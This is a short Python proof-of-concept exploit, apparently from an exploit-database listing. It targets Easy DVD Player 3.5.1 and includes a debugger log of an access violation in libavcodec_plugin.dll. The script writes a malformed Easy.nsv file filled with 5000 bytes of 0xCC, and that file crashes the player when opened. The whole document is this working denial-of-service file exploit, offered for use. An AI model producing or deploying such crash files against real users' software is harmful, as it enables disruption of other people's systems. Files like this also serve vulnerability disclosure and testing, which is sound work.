#!/usr/bin/python 
# Exploit Title:Easy DVD Player (libav) libavcodec_plugin.dll DOS 
# Download link :http://www.easy-dvd-player.com/download.htm
# Author: metacom
# version: version V3.5.1
# Category: poc
# Tested on: windows 7 German  

'''
read violation on 0x00000010
libavcodec_plugin.dll
(714.520): Access violation - code c0000005 (!!! second chance !!!)
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Program Files\ZJMedia\Easy DVD Player\plugins\libavcodec_plugin.dll - 
eax=ffffffff ebx=01c7b068 ecx=757a98da edx=00000000 esi=0432f93c edi=ffffffff
eip=61acc6d0 esp=0432f900 ebp=62134ce0 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010202
libavcodec_plugin!vlc_entry__1_1_0g+0x1b350:
61acc6d0 8b4210          mov     eax,dword ptr [edx+10h] ds:0023:00000010=????????
'''
 
filename= "Easy.nsv"


buffer = "\xCC" * 5000

textfile = open(filename , 'w')
textfile.write(buffer)
textfile.close()